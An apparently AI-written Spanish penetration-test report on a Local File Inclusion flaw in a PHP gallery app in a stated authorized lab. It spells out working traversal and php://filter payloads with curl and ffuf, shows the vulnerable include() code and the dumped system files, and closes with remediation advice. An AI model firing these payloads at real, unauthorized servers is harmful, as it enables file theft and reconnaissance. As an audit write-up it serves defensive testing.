# Informe de Auditoría de Seguridad — Local File Inclusion (LFI)
**Fecha:** 2026-04-21T08:48:33  
**Analista:** Auditor Ofensivo (Claude Sonnet 4.6)  
**Target:** http://web.dev.local:8081  
**Autorización:** Entorno de laboratorio autorizado  

---

## Resumen Ejecutivo

Se ha identificado y explotado activamente una vulnerabilidad crítica de **Local File Inclusion (LFI)** en el parámetro `page` del script `gallery.php`. La vulnerabilidad permite leer ficheros arbitrarios del sistema operativo, incluyendo `/etc/passwd`, ficheros de configuración del servidor y código fuente de la aplicación.

| Campo | Valor |
|-------|-------|
| **Severidad** | Crítica (CVSS 9.1) |
| **URL vulnerable** | `http://web.dev.local:8081/gallery.php` |
| **Parámetro** | `page` (GET) |
| **Tipo** | Local File Inclusion sin restricción |
| **VULN_FOUND** | `true` |
| **VULN_EXPLOITED** | `true` |

---

## 1. Reconocimiento

### 1.1 Tecnología del servidor

```
HTTP/1.1 200 OK
Server: Apache/2.4.65 (Debian)
X-Powered-By: PHP/8.1.33
```

### 1.2 Descubrimiento de parámetros

Análisis del HTML de la página principal reveló los siguientes enlaces con parámetro `page`:

```
http://web.dev.local:8081/gallery.php?page=modern
http://web.dev.local:8081/gallery.php?page=classic
http://web.dev.local:8081/gallery.php?page=abstract
http://web.dev.local:8081/gallery.php?page=about
```

### 1.3 Fuzzing con ffuf

```bash
ffuf -u "http://web.dev.local:8081/gallery.php?page=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
  -fs 2802 -t 20 -timeout 5
```

**Resultados significativos (ficheros accesibles):**

| Fichero | Tamaño respuesta |
|---------|-----------------|
| `/etc/apache2/apache2.conf` | 9754 bytes |
| `/var/log/dpkg.log` | 142882 bytes |
| `/etc/adduser.conf` | 6549 bytes |
| `/etc/resolv.conf` | 2901 bytes |
| `/etc/hosts` | 2676 bytes |
| `/proc/version` | ~200 bytes |
| `/proc/self/cmdline` | ~200 bytes |

---

## 2. Análisis del Código Fuente — Path Disclosure y Vulnerabilidad

### 2.1 Path Disclosure

Al solicitar un fichero inexistente, el servidor reveló la ruta absoluta:

```
Warning: include(/etc/shadow): Failed to open stream: Permission denied 
in /var/www/html/gallery.php on line 104
```

**Ruta de la aplicación:** `/var/www/html/gallery.php`

### 2.2 Extracción del código fuente via PHP Filter Wrapper

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/var/www/html/gallery.php"
```

El blob base64 en la respuesta fue decodificado, revelando el código vulnerable:

```php
<?php
$page = $_GET['page'] ?? 'modern';

// Check if the page parameter contains file extension
if (strpos($page, '.') !== false) {
    // If it has an extension, use it as-is 
    $file = $page;
} else {
    // Otherwise, assume it's a page in the pages directory
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    echo "<div class='error'>...";
    // Try to include anyway
    @include($file);   // <-- VULNERABLE: include sin sanitización
}
?>
```

**Causa raíz:** El parámetro `$page` se usa directamente en `include()` sin ninguna validación ni sanitización de rutas. Si contiene un `.` se usa tal cual, permitiendo path traversal absoluto o relativo.

---

## 3. Explotación — Lectura de Ficheros del Sistema

### 3.1 Payload básico — Directory Traversal

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=../../../etc/passwd"
```

**Resultado exitoso — `/etc/passwd` extraído:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 3.2 Payload alternativo — Ruta absoluta

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=/etc/passwd"
# Funciona igualmente (no hay .php append cuando contiene '.')
```

### 3.3 Información del sistema operativo

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=../../../proc/version"
```

**Resultado:**
```
Linux version 6.8.0-41-generic (buildd@lcy02-amd64-100) 
(x86_64-linux-gnu-gcc-13 (Ubuntu 13.2.0-23ubuntu4) 13.2.0, 
GNU ld (GNU Binutils for Ubuntu) 2.42) 
#41-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 2 20:41:06 UTC 2024
```

### 3.4 Información del proceso Apache

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=../../../proc/self/cmdline"
# Resultado: apache2 -DFOREGROUND

curl -s "http://web.dev.local:8081/gallery.php?page=../../../proc/self/status"
# Resultado: UID=33 (www-data), PID=706
```

### 3.5 Información de red

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=../../../etc/hosts"
```

**Resultado:**
```
127.0.0.1       localhost
::1             localhost ip6-localhost ip6-loopback
172.19.0.2      d5054e367753
```

### 3.6 Configuración Apache

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=/etc/apache2/apache2.conf"
# Fichero completo de configuración de Apache 2.4 — accesible
```

### 3.7 Intento de escalada — `/etc/shadow`

```bash
curl -s "http://web.dev.local:8081/gallery.php?page=../../../etc/shadow"
```

**Resultado:** `Permission denied` — El proceso `www-data` (UID 33) no tiene permisos de lectura sobre `/etc/shadow`.

### 3.8 Intento de Log Poisoning

Los ficheros `/var/log/apache2/access.log` y `/var/log/apache2/error.log` no son accesibles por el proceso `www-data`. El log poisoning no fue viable.

---

## 4. Resumen de Impacto

| Técnica | Resultado |
|---------|-----------|
| Directory Traversal `../../../etc/passwd` | ✅ EXITOSO |
| PHP filter wrapper `php://filter/...` | ✅ EXITOSO (código fuente extraído) |
| Lectura `/etc/hosts`, `/etc/hostname` | ✅ EXITOSO |
| Lectura `/proc/version`, `/proc/self/status` | ✅ EXITOSO |
| Lectura `/etc/apache2/apache2.conf` | ✅ EXITOSO |
| Lectura `/var/log/dpkg.log` | ✅ EXITOSO |
| Lectura `/etc/shadow` | ❌ Permission denied |
| Log Poisoning → RCE | ❌ Logs no accesibles |
| Lectura `/root/.ssh/id_rsa` | ❌ No encontrado/sin permisos |

---

## 5. Conclusiones

La aplicación **Galería de Arte Virtual** en `http://web.dev.local:8081` presenta una vulnerabilidad crítica de LFI sin ninguna protección. El atacante puede:

1. **Leer ficheros arbitrarios del sistema** con los permisos del proceso Apache (`www-data`)
2. **Enumerar usuarios del sistema** vía `/etc/passwd`
3. **Obtener información sensible de red e infraestructura** (`/etc/hosts`, `/proc/version`)
4. **Extraer el código fuente completo** de la aplicación via `php://filter`
5. **Revelar la configuración interna** de Apache

---

## 6. Recomendaciones

1. **Validación estricta del parámetro `page`:** Usar una whitelist de páginas permitidas.
2. **Eliminar `@include($file)`:** Nunca incluir ficheros no encontrados.
3. **No usar input del usuario directamente en `include()`:** Mapear valores a rutas fijas.
4. **Deshabilitar errores de PHP en producción:** `display_errors = Off` en `php.ini`.
5. **Principio de mínimo privilegio:** Restringir permisos del usuario `www-data`.

```php
// Solución propuesta:
$allowed = ['modern', 'classic', 'abstract', 'about'];
if (!in_array($_GET['page'], $allowed)) {
    $page = 'modern';
} else {
    $page = $_GET['page'];
}
include("pages/" . $page . ".php");
```

---

*Informe generado por GitHub Copilot CLI — Auditoría de seguridad LFI — Laboratorio autorizado*
